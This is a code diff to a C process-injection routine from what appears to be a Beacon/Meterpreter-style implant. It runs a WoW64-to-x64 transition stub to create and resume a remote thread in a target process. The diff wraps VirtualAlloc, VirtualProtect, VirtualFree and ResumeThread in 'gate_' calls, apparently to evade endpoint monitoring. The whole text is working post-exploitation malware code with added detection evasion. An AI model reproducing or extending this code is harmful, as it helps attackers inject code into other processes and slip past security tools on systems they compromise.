@@ -2,6 +2,7 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <windows.h>
+#include "beacon_gate.h" /* BeaconGate: gate_* = the API with the gate in front */
 #include <Tlhelp32.h>
 #include "beacon.h"
 #include "inject.h"
@@ -85,22 +86,22 @@ BOOL inject_via_remotethread_wow64(HANDLE hProcess, LPVOID lpStartAddress, LPVOI
 	 * for its whole lifetime). */
 
 	// alloc a buffer in this process for the EXECUTEX64 function
-	pExecuteX64 = (EXECUTEX64)VirtualAlloc(NULL, sizeof(migrate_executex64), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+	pExecuteX64 = (EXECUTEX64)gate_VirtualAlloc(NULL, sizeof(migrate_executex64), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 	if (!pExecuteX64)
 		return FALSE;
 
 	// alloc a buffer in this process for the X64FUNCTION code
-	pX64function = (X64FUNCTION)VirtualAlloc(NULL, sizeof(migrate_wownativex), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+	pX64function = (X64FUNCTION)gate_VirtualAlloc(NULL, sizeof(migrate_wownativex), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 	if (!pX64function) {
-		VirtualFree(pExecuteX64, 0, MEM_RELEASE);
+		gate_VirtualFree(pExecuteX64, 0, MEM_RELEASE);
 		return FALSE;
 	}
 
 	// alloc the context (stays RW: handle write-back from x64 mode)
-	ctx = (WOW64CONTEXT *)VirtualAlloc(NULL, sizeof(WOW64CONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+	ctx = (WOW64CONTEXT *)gate_VirtualAlloc(NULL, sizeof(WOW64CONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 	if (!ctx) {
-		VirtualFree(pExecuteX64, 0, MEM_RELEASE);
-		VirtualFree(pX64function, 0, MEM_RELEASE);
+		gate_VirtualFree(pExecuteX64, 0, MEM_RELEASE);
+		gate_VirtualFree(pX64function, 0, MEM_RELEASE);
 		return FALSE;
 	}
 
@@ -111,8 +112,8 @@ BOOL inject_via_remotethread_wow64(HANDLE hProcess, LPVOID lpStartAddress, LPVOI
 	memcpy(pX64function, &migrate_wownativex, sizeof(migrate_wownativex));
 
 	// both code blocks become RX before anything executes
-	VirtualProtect(pExecuteX64, sizeof(migrate_executex64), PAGE_EXECUTE_READ, &old);
-	VirtualProtect(pX64function, sizeof(migrate_wownativex), PAGE_EXECUTE_READ, &old);
+	gate_VirtualProtect(pExecuteX64, sizeof(migrate_executex64), PAGE_EXECUTE_READ, &old);
+	gate_VirtualProtect(pX64function, sizeof(migrate_wownativex), PAGE_EXECUTE_READ, &old);
 
 	// set the context
 	ctx->h.hProcess = hProcess;
@@ -124,17 +125,17 @@ BOOL inject_via_remotethread_wow64(HANDLE hProcess, LPVOID lpStartAddress, LPVOI
 	// The native function will use the native Win64 API's to create a remote thread in the target process.
 	if (!pExecuteX64(pX64function, (DWORD)ctx)) {
 		SetLastError(ERROR_ACCESS_DENIED);
-		VirtualFree(pExecuteX64, 0, MEM_RELEASE);
-		VirtualFree(pX64function, 0, MEM_RELEASE);
-		VirtualFree(ctx, 0, MEM_RELEASE);
+		gate_VirtualFree(pExecuteX64, 0, MEM_RELEASE);
+		gate_VirtualFree(pX64function, 0, MEM_RELEASE);
+		gate_VirtualFree(ctx, 0, MEM_RELEASE);
 		return FALSE;
 	}
 
 	if (!ctx->t.hThread) {
 		SetLastError(ERROR_INVALID_HANDLE);
-		VirtualFree(pExecuteX64, 0, MEM_RELEASE);
-		VirtualFree(pX64function, 0, MEM_RELEASE);
-		VirtualFree(ctx, 0, MEM_RELEASE);
+		gate_VirtualFree(pExecuteX64, 0, MEM_RELEASE);
+		gate_VirtualFree(pX64function, 0, MEM_RELEASE);
+		gate_VirtualFree(ctx, 0, MEM_RELEASE);
 		return FALSE;
 	}
 
@@ -144,11 +145,11 @@ BOOL inject_via_remotethread_wow64(HANDLE hProcess, LPVOID lpStartAddress, LPVOI
 	/* PITA, this function creates our thread in a suspended state. Dumb, I know
 	* See: meterpreter/source/extensions/stdapi/server/sys/process/thread.c:139
 	*/
-	ResumeThread(ctx->t.hThread);
+	gate_ResumeThread(ctx->t.hThread);
 
-	VirtualFree(pExecuteX64, 0, MEM_RELEASE);
-	VirtualFree(pX64function, 0, MEM_RELEASE);
-	VirtualFree(ctx, 0, MEM_RELEASE);
+	gate_VirtualFree(pExecuteX64, 0, MEM_RELEASE);
+	gate_VirtualFree(pX64function, 0, MEM_RELEASE);
+	gate_VirtualFree(ctx, 0, MEM_RELEASE);
 
 	return TRUE;
 }
